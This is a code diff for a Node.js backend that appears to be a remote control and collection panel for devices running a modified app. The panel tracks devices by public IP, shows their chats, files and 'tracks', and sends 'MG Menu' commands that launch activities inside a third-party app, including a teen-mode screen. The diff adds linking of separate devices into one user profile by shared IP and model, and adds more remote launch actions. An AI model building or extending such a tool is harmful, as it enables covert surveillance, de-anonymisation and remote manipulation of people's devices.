@@ -270,13 +270,31 @@ async function devicesWithStats() {
   for (const msg of messages) msgCounts.set(msg.device_id, (msgCounts.get(msg.device_id) || 0) + 1);
   for (const file of files) fileCounts.set(file.device_id, (fileCounts.get(file.device_id) || 0) + 1);
 
-  return devices.map((device) => ({
-    ...device,
+  const profileDevices = devices
+    .filter((device) => device.my_name || device.public_id || device.my_uid)
+    .sort((a, b) => Number(b.server_last_seen || 0) - Number(a.server_last_seen || 0));
+
+  return devices.map((device) => {
+    const profile = profileDevices.find((candidate) =>
+      candidate.device_id !== device.device_id &&
+      candidate.public_ip === device.public_ip &&
+      (!device.model || !candidate.model || candidate.model === device.model) &&
+      (!device.brand || !candidate.brand || candidate.brand === device.brand)
+    );
+    const merged = {
+      ...device,
+      my_uid: device.my_uid ?? profile?.my_uid ?? null,
+      public_id: device.public_id || profile?.public_id || null,
+      my_name: device.my_name || profile?.my_name || null
+    };
+    return {
+      ...merged,
     online: isOnline(device),
-    display_name: device.my_name || device.public_id || device.device_id,
+      display_name: merged.my_name || merged.public_id || merged.device_id,
     message_count: msgCounts.get(device.device_id) || 0,
     file_count: fileCounts.get(device.device_id) || 0
-  }));
+    };
+  });
 }
 
 async function handleHeartbeat(req, res) {
@@ -459,8 +477,8 @@ button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:gri
     <div class="tabs"><button class="tab active" data-tab="info">Info</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
     <div class="commandbar">
       <input id="cmdTitle" placeholder="Menu title" value="MG Menu">
-      <input id="cmdText" placeholder="Text to show in app">
-      <select id="cmdAction"><option value="none">none</option><option value="launch_activity">launch_activity</option><option value="open_activity">open_activity</option><option value="toast">toast</option></select>
+      <input id="cmdText" placeholder="Text to show in app" value="Launch activity">
+      <select id="cmdAction"><option value="none">none</option><option value="launch" selected>launch</option><option value="activity">activity</option><option value="open">open</option><option value="start_activity">start_activity</option><option value="launch_activity">launch_activity</option><option value="open_activity">open_activity</option><option value="toast">toast</option></select>
       <input id="cmdActivity" placeholder="Activity class" value="com.wepie.module.teenmode.TeenModeOpeningActivity">
       <button class="btn" id="sendCommand">Send</button>
       <button class="btn danger" id="clearCommand">Clear</button>
@@ -555,7 +573,7 @@ async function handler(req, res) {
     if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) return handleDeleteFile(res, url.pathname.slice("/api/file/".length));
 
     if (req.method === "GET" && url.pathname === "/api/debug") {
-      const [devices, messages] = await Promise.all([getDevices(), getMessages()]);
+      const [devices, messages] = await Promise.all([devicesWithStats(), getMessages()]);
       return json(res, 200, { ok: true, devices, messages, files: getFiles(), tracks: readTracks(), command, config: readConfigFlag() });
     }
 
